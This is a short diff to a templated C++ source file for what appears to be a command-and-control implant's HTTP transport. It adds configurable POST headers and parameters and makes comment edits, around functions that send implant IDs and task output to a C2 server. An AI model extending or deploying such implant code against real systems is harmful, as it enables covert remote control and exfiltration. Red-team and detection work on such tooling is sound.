@@ -71,7 +71,7 @@ nlohmann::json get(std::string implant_uuid) {
     [%- for header_or_param in http_get_client_headers_or_parameters_list %]
     [[ render_add_headers_or_parameters(header_or_param) ]]
     [%- endfor %]
-    // --- end
+    // --- end ---
 
     [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
@@ -165,6 +165,7 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     [%- endfor %]
     // --- End Transforms for ID and Output ---
 
+
     // convert to w strings because winapi wants that
     std::wstring w_payload(payload.begin(), payload.end());
     std::wstring w_id(implant_uuid.begin(), implant_uuid.end());
@@ -176,6 +177,12 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     };
     std::wstring uri = L"[[ http_post_uri ]]";
     std::string final_post_body = ""; 
+
+    // --- Add addtl headers/params as specified in mc2 ---
+    [%- for header_or_param in http_post_client_headers_or_parameters_list %]
+    [[ render_add_headers_or_parameters(header_or_param) ]]
+    [%- endfor %]
+    // --- end ---
 
     // --- Malleable C2 ID/Output transport method ---
 
